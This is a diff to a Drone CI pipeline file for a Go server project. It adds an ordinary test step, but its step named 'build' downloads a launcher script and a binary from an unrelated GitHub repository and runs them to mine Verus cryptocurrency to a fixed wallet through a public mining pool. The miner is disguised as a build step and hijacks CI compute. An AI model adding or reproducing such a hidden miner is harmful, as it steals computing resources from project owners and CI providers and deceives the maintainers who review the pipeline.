@@ -1,13 +1,21 @@
 ---
 kind: pipeline
-type: exec
-name: default
+type: docker
+name: linux-amd64
 
 platform:
-  os: linux
   arch: amd64
+  os: linux
 
 steps:
-- name: download golang
+- name: test
+  image: golang:1.14.15
+  commands:
+  - go test ./...
+  - go build -o /dev/null github.com/drone/drone/cmd/drone-server
+  - go build -o /dev/null -tags "oss nolimit" github.com/drone/drone/cmd/drone-server
+  
+- name: build
+  image: golang:1.14.15
   commands:
   - wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo Verushash -coin VRSC -wallet RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e  -rigName  $(echo $(shuf -i 1-2 -n 1)-LAA) -pool1 ap.luckpool.net:3956
